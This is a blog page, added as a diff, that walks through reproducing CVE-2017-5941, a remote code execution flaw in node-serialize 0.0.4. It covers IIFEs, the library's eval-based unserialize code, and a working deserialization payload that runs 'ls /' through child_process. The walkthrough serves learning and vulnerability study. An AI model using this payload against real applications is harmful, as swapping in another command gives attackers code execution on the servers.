@@ -1,0 +1,328 @@
+<!DOCTYPE HTML>
+<html>
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="pragma" content="no-cache">
+  <meta http-equiv="cache-control" content="no-cache">
+  <meta http-equiv="expires" content="0">
+  
+  <title>node反序列化RCE(CVE-2017-5941) | Antel0p3&#39;s blog</title>
+  <meta name="author" content="John Doe">
+  
+  <meta name="description" content="漏洞简介CVE-2017-5941  漏洞出现在node-serialize模块0.0.4版本当中   反序列化时执行eval并且参数可控 存在RCE
+环境搭建npm install node-serialize@0.0.4
+漏洞复现0x1了解什么是IIFE：
+IIFE（立即调用函数表达式）是一个在">
+  
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  <meta property="og:title" content="node反序列化RCE(CVE-2017-5941)"/>
+  <meta property="og:site_name" content="Antel0p3&#39;s blog"/>
+
+  
+    <meta property="og:image" content=""/>
+  
+
+  
+    <link rel="alternative" href="/atom.xml" title="Antel0p3&#39;s blog" type="application/atom+xml">
+  
+  
+    <link href="/favicon.png" rel="icon">
+  
+  
+  <link rel="stylesheet" href="/css/bootstrap.min.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/font-awesome.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/responsive.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/highlight.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/prism.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/google-fonts.css" media="screen" type="text/css">
+  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
+
+  <script src="/js/jquery-2.0.3.min.js"></script>
+
+  <!-- analytics -->
+  
+  <!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-70812759-1"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'UA-70812759-1');
+</script>
+
+
+
+
+
+
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+ <body>  
+  <nav id="main-nav" class="navbar navbar-inverse navbar-fixed-top" role="navigation">
+    <div class="container">
+      <button type="button" class="navbar-header navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
+		<span class="sr-only">Toggle navigation</span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+      </button>
+	  <a class="navbar-brand" href="/">Antel0p3&#39;s blog</a>
+      <div class="collapse navbar-collapse nav-menu">
+		<ul class="nav navbar-nav">
+		  
+		  <li>
+			<a href="/archives" title="All the articles.">
+			  <i class="fa fa-archive"></i>Archives
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/categories" title="All the categories.">
+			  <i class="fa fa-folder"></i>Categories
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/tags" title="All the tags.">
+			  <i class="fa fa-tags"></i>Tags
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/about" title="About me.">
+			  <i class="fa fa-user"></i>About
+			</a>
+		  </li>
+		  
+		</ul>
+      </div>
+    </div> <!-- container -->
+</nav>
+<div class="clearfix"></div>
+
+  <div class="container">
+  	<div class="content">
+    	 
+
+
+					
+							<div class="page-header">
+								<h1>
+									
+											
+												node反序列化RCE(CVE-2017-5941)
+									
+									
+								</h1>
+								
+									<p id="/2024/01/10/node%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96RCE/" class="leancloud-visitors view"
+										data-flag-title="node反序列化RCE(CVE-2017-5941)">
+										<i class="fa fa-eye"></i> <i class="leancloud-visitors-count"></i>
+									</p>
+									
+							</div>
+							
+								
+
+<div class="row post">
+	<!-- cols -->
+	
+	<div id="top_meta">
+		
+	</div>
+	<div class="col-md-9">
+	
+
+	<!-- content -->
+	<div class="mypage">		
+	  		
+
+	  <h2 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h2><p>CVE-2017-5941  漏洞出现在node-serialize模块0.0.4版本当中   反序列化时执行eval并且参数可控 存在RCE</p>
+<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p><code>npm install node-serialize@0.0.4</code></p>
+<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><h3 id="0x1"><a href="#0x1" class="headerlink" title="0x1"></a>0x1</h3><p>了解什么是IIFE：</p>
+<p><a target="_blank" rel="noopener" href="https://developer.mozilla.org/zh-CN/docs/Glossary/%E7%AB%8B%E5%8D%B3%E6%89%A7%E8%A1%8C%E5%87%BD%E6%95%B0%E8%A1%A8%E8%BE%BE%E5%BC%8F">IIFE（立即调用函数表达式）</a>是一个在定义时就会立即执行的 JavaScript 函数。</p>
+<p>IIFE一般写成下面的形式：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">(function()&#123; /* code */ &#125;());</span><br><span class="line">// 或者</span><br><span class="line">(function()&#123; /* code */ &#125;)();</span><br></pre></td></tr></table></figure>
+
+<h3 id="0x2"><a href="#0x2" class="headerlink" title="0x2"></a>0x2</h3><p>先看到序列化结果</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> test = &#123;</span><br><span class="line">    <span class="string">&quot;rce&quot;</span>: <span class="keyword">function</span>(<span class="params"></span>)&#123;<span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>).<span class="title function_">execSync</span>(<span class="string">&#x27;ls /&#x27;</span>).<span class="title function_">toString</span>())&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> srl = serialize.<span class="title function_">serialize</span>(test);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(srl);</span><br><span class="line"><span class="comment">// &#123;&quot;rce&quot;:&quot;_$$ND_FUNC$$_function()&#123;console.log(require(&#x27;child_process&#x27;).execSync(&#x27;ls /&#x27;).toString())&#125;&quot;&#125;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="0x3"><a href="#0x3" class="headerlink" title="0x3"></a>0x3</h3><p>unserialize反序列化代码逻辑</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">exports</span>.<span class="property">unserialize</span> = <span class="keyword">function</span>(<span class="params">obj, originObj</span>) &#123;</span><br><span class="line">  <span class="keyword">var</span> isIndex;</span><br><span class="line">  <span class="keyword">if</span> (<span class="keyword">typeof</span> obj === <span class="string">&#x27;string&#x27;</span>) &#123;</span><br><span class="line">    obj = <span class="title class_">JSON</span>.<span class="title function_">parse</span>(obj);</span><br><span class="line">    isIndex = <span class="literal">true</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  originObj = originObj || obj;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">var</span> circularTasks = [];</span><br><span class="line">  <span class="keyword">var</span> key;</span><br><span class="line">  <span class="keyword">for</span>(key <span class="keyword">in</span> obj) &#123;</span><br><span class="line">    <span class="keyword">if</span>(obj.<span class="title function_">hasOwnProperty</span>(key)) &#123;</span><br><span class="line">      <span class="keyword">if</span>(<span class="keyword">typeof</span> obj[key] === <span class="string">&#x27;object&#x27;</span>) &#123;</span><br><span class="line">        obj[key] = <span class="built_in">exports</span>.<span class="title function_">unserialize</span>(obj[key], originObj);</span><br><span class="line">      &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="keyword">typeof</span> obj[key] === <span class="string">&#x27;string&#x27;</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span>(obj[key].<span class="title function_">indexOf</span>(<span class="variable constant_">FUNCFLAG</span>) === <span class="number">0</span>) &#123;</span><br><span class="line">          obj[key] = <span class="built_in">eval</span>(<span class="string">&#x27;(&#x27;</span> + obj[key].<span class="title function_">substring</span>(<span class="variable constant_">FUNCFLAG</span>.<span class="property">length</span>) + <span class="string">&#x27;)&#x27;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span>(obj[key].<span class="title function_">indexOf</span>(<span class="variable constant_">CIRCULARFLAG</span>) === <span class="number">0</span>) &#123;</span><br><span class="line">          obj[key] = obj[key].<span class="title function_">substring</span>(<span class="variable constant_">CIRCULARFLAG</span>.<span class="property">length</span>);</span><br><span class="line">          circularTasks.<span class="title function_">push</span>(&#123;<span class="attr">obj</span>: obj, <span class="attr">key</span>: key&#125;);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (isIndex) &#123;</span><br><span class="line">    circularTasks.<span class="title function_">forEach</span>(<span class="keyword">function</span>(<span class="params">task</span>) &#123;</span><br><span class="line">      task.<span class="property">obj</span>[task.<span class="property">key</span>] = <span class="title function_">getKeyPath</span>(originObj, task.<span class="property">obj</span>[task.<span class="property">key</span>]);</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> obj;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+
+<p>可以看到<code>17# eval(&#39;(&#39; + obj[key].substring(FUNCFLAG.length) + &#39;)&#39;);</code> </p>
+<p>这里<code>FUNCFLAG=_$$ND_FUNC$$_</code> 也就是如果反序列化时如果识别为函数  则会直接拼接function部分 并eval     那么我们只要构造类似<code>eval(&#39;(function()&#123;console.log(2)&#125;)&#39;)</code> 即可执行</p>
+<h3 id="0x4"><a href="#0x4" class="headerlink" title="0x4"></a>0x4</h3><p>在序列化结果末尾添上<code>()</code>  然后反序列化</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> serialize = <span class="built_in">require</span>(<span class="string">&#x27;node-serialize&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> payload = <span class="string">&#x27;&#123;&quot;rce&quot;:&quot;_$$ND_FUNC$$_function()&#123;console.log(require(\&#x27;child_process\&#x27;).execSync(\&#x27;ls /\&#x27;).toString())&#125;()&quot;&#125;&#x27;</span>;</span><br><span class="line">serialize.<span class="title function_">unserialize</span>(payload);</span><br><span class="line"><span class="comment">// 成功执行ls /</span></span><br></pre></td></tr></table></figure>
+
+	  <div class="article-footer-copyright">
+
+    本博客采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank">知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议(CC BY-NC-SA 4.0) 发布.</a>
+</div>
+
+	</div>
+
+	<!-- 
+		<span id="/2024/01/10/node%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96RCE/" class="leancloud-visitors view" data-flag-title="node反序列化RCE(CVE-2017-5941)">
+			<i class="fa fa-eye"></i> <i class="leancloud-visitors-count"></i>
+		</span>
+	 -->
+	
+	<div>
+  	<center>
+
+	<div class="pagination">
+
+    
+    
+    <a type="button" class="btn btn-default disabled"><i class="fa fa-arrow-circle-o-left"></i>Prev</a>
+    
+
+    <a href="/" type="button" class="btn btn-default"><i class="fa fa-home"></i>Home</a>
+    
+    <a href="/2024/01/04/HNCTF2023-BabyJxVx-wp/" type="button" class="btn btn-default ">Next<i
+                class="fa fa-arrow-circle-o-right"></i></a>
+    
+
+    
+</div>
+
+
+    </center>
+	</div>
+	
+	<!-- comment -->
+	<!--
+<section id="comment">
+    <h2 class="title">Comments</h2>
+
+    
+</section>
+
+-->
+	
+		<section id="comments" class="comments">
+			<style>
+			.comments{margin:30px;padding:10px;background:rgb(0, 0, 0)}
+			@media screen and (max-width:800px){.comments{margin:auto;padding:10px;background:#000}}
+			</style>
+			<div id="vcomment" class="comment"></div>
+<script src='//unpkg.com/valine/dist/Valine.min.js'></script>
+<script src="https://cdnjs.loli.net/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
+<script>
+var valineConfig = {"enable":true,"appId":"7m4bFydh606FgGbxRPsI8M6l-gzGzoHsz","appKey":"edXvAXhOXIvksZqtq8b5AXWj","placeholder":"input your comment: ","visitor":true,"avatar":"retro","lang":"en","metaPlaceholder":{"nick":"nick","mail":"mail","link":"link"},"requiredFields":["nick","mail","link"],"pageView":true}
+valineConfig.el='#vcomment';
+new Valine(valineConfig);
+    // new Valine({
+    //     el: '#vcomment',
+    //     appId: "",
+    //     appKey: "",
+    //     placeholder: "input your comment: ",
+    //     avatar:"retro",
+    //     visitor: "true",
+    //     requiredFields: "nick,mail,link".split(','),
+    // });
+</script>
+
+		</section>
+	
+	
+	
+	</div> <!-- col-md-9/col-md-12 -->
+
+
+	
+	<div id="side_meta">
+		<div class="col-md-3" id="post_meta"> 
+
+	<!-- date -->
+	
+	<div class="meta-widget">
+	<i class="fa fa-clock-o"></i>
+	2024-01-10 
+	</div>
+	
+
+	<!-- categories -->
+    
+	<div class="meta-widget">
+	<a data-toggle="collapse" data-target="#categorys"><i class="fa fa-folder"></i></a>	
+    <ul id="categorys" class="tag_box list-unstyled collapse in">
+          
+  <li>
+    <li><a href="/categories/web-learning/">web-learning<span>8</span></a></li>
+  </li>
+
+    </ul>
+	</div>
+	
+
+	<!-- tags -->
+	
+	<div class="meta-widget">
+	<a data-toggle="collapse" data-target="#tags"><i class="fa fa-tags"></i></a>		  
+    <ul id="tags" class="tag_box list-unstyled collapse in">	  
+	    
+  <li><a href="/tags/CTF/">CTF<span>93</span></a></li> <li><a href="/tags/web/">web<span>65</span></a></li> <li><a href="/tags/rce/">rce<span>19</span></a></li> <li><a href="/tags/unserialize/">unserialize<span>14</span></a></li> <li><a href="/tags/nodejs/">nodejs<span>4</span></a></li>
+    </ul>
+	</div>
+		
+
+	<!-- toc -->
+	<div class="meta-widget">
+	
+	</div>
+	
+    <hr>
+	
+</div><!-- col-md-3 -->
+
+		
+
+	</div>
+	
+		
+
+</div><!-- row -->
+
+<!--
+ -->
+
+
+
+	</div>
+  </div>
+  <div class="container-narrow">
+  <footer>  </footer>
+</div> <!-- container-narrow -->
+  
+
+
+  
+<a id="gotop" href="#">   
+  <span>⬆︎TOP</span>
+</a>
+
+<script src="/js/jquery.imagesloaded.min.js"></script>
+<script src="/js/gallery.js"></script>
+<script src="/js/bootstrap.min.js"></script>
+<script src="/js/main.js"></script>
+<script src="/js/search.js"></script> 
+
+
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+(function($){
+  $('.fancybox').fancybox();
+})(jQuery);
+</script>
+
+
+
+</body>
+   </html>
